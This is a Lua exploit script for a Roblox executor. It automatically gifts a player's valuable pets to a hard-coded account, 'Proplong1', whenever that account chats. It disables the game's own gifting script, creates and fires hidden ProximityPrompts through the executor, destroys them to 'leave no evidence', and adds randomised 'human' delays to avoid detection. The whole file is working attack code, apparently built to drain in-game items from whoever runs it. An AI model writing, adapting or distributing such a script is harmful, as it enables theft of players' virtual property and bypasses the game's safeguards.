--[[
    THE DEFINITIVE BYPASS - "HOSTILE TAKEOVER" PROTOCOL
    - STRATEGY: Gifter-only. Disables the game's own gifting script and replaces it with our own custom prompt.
    - CORE: Creates and destroys a new ProximityPrompt for each gift, giving us full control and leaving no trace.
    - This is the final, self-contained, and most powerful version of the script.
]]

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")

local LocalPlayer = Players.LocalPlayer

-- =========================================================================================
-- ### CONFIGURATION ###
local MasterPetList = {"Butterfly", "Raccoon", "Queen Bee", "Disco Bee", "Mimic Octopus", "Dragonfly", "Pack Bee"}
local TrashPetList = {"Dog", "Golden Lab", "Bunny", "Black Bunny", "Cat", "Orange Tabby", "Chicken", "Pig", "Crab", "Starfish", "Seagull"}
local TargetUsername = "Proplong1"
local giftingWeightThreshold = 11
-- =========================================================================================

local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local humanoid = character and character:FindFirstChild("Humanoid")
local backpack = LocalPlayer and LocalPlayer:FindFirstChild("Backpack")

local giftingActive = false

-- Helper function, remains the same.
local function isPetInList(petName, list)
    for i = 1, #list do
        local nameInList = list[i]
        if string.sub(petName, 1, #nameInList) == nameInList then
            return true, nameInList
        end
    end
    return false, nil
end

-- The new Hostile Takeover Gifter function.
local function giftSingleBatch_HostileTakeover(targetPlayer)
    if not humanoid or not backpack then giftingActive = false; return end
    print("[Gifter] Hostile Takeover Protocol: Starting new gift batch...")
    
    local targetCharacter = targetPlayer.Character
    if not targetCharacter or not targetCharacter.Parent then
        print("[Gifter Error] Could not find the target player's character in the game.")
        giftingActive = false
        return
    end
    
    -- Step 1: Seek and Destroy the game's original gifting script.
    local enemyScript = targetCharacter:FindFirstChild("GiftPrompt", true)
    if enemyScript and enemyScript:IsA("LocalScript") then
        enemyScript.Disabled = true
        print("[Gifter] Enemy 'GiftPrompt' script has been neutralized.")
    end

    local petsToGiftSnapshot = {}
    for _, item in ipairs(backpack:GetChildren()) do
        if item:IsA("Tool") then
            local isMaster, _ = isPetInList(item.Name, MasterPetList)
            local isTrash, _ = isPetInList(item.Name, TrashPetList)
            local isHuge = false
            local weightString = string.match(item.Name, "%[(%d+%.?%d*) KG%]")
            if weightString then
                local weight = tonumber(weightString)
                if weight and weight >= giftingWeightThreshold then isHuge = true end
            end
            if isHuge or (isMaster and not isTrash) then table.insert(petsToGiftSnapshot, item) end
        end
    end

    if #petsToGiftSnapshot == 0 then print("[Gifter] No giftable pets found.")
    else print("[Gifter] Found " .. #petsToGiftSnapshot .. " pets. Beginning assault...") end

    for i = 1, #petsToGiftSnapshot do
        local itemToGift = petsToGiftSnapshot[i]
        if targetPlayer.Parent == nil or itemToGift.Parent ~= backpack then continue end

        humanoid:EquipTool(itemToGift)
        print("[Gifter] Equipped: " .. itemToGift.Name)
        task.wait(0.1) -- Minimal wait after equipping.

        -- Step 2: Forge our own weapon. Create a new prompt.
        local ourPrompt = Instance.new("ProximityPrompt")
        ourPrompt.ObjectText = "Pet"
        ourPrompt.ActionText = "Gift"
        ourPrompt.Adornee = targetCharacter.PrimaryPart or targetCharacter.HumanoidRootPart
        ourPrompt.Parent = targetCharacter

        print("[Gifter] Custom prompt forged and attached to target.")
        task.wait(0.1) -- Wait for the prompt to register.

        if fireproximityprompt then
            -- Step 3: Fire our custom prompt.
            print("[Gifter] Firing our prompt with executor toolkit...")
            fireproximityprompt(ourPrompt)
        else
            warn("[Gifter] 'fireproximityprompt' not found. This may fail.")
            game:GetService("ProximityPromptService"):InputTriggered(ourPrompt)
        end
        
        -- Step 4: Leave no trace.
        ourPrompt:Destroy()
        print("[Gifter] Prompt destroyed. Leaving no evidence.")
        
        local humanDelay = 0.8 + (math.random(1, 40) / 100)
        task.wait(humanDelay)
    end
    
    giftingActive = false
    print("[Gifter] Hostile Takeover complete. Script is now idle.")
end

-- The trigger remains the same.
local function onPlayerChatted(player, message)
    if player.Name == TargetUsername then
        if not giftingActive then
            giftingActive = true 
            task.spawn(giftSingleBatch_HostileTakeover, player)
        else
            print("[Gifter] A gift batch is already in progress. Please wait.")
        end
    end
end

-- === SCRIPT EXECUTION STARTS HERE ===
print("[System] Hostile Takeover Protocol Loaded.")
if not fireproximityprompt then
    warn("[System Warning] This executor does not support 'fireproximityprompt'. The bypass may fail.")
end
print("[System] Target set to: " .. TargetUsername)

Players.PlayerAdded:Connect(function(player) player.Chatted:Connect(function(message) onPlayerChatted(player, message) end) end)
for _, player in ipairs(Players:GetPlayers()) do player.Chatted:Connect(function(message) onPlayerChatted(player, message) end) end

print("[System] Awaiting chat from '" .. TargetUsername .. "' to begin.")
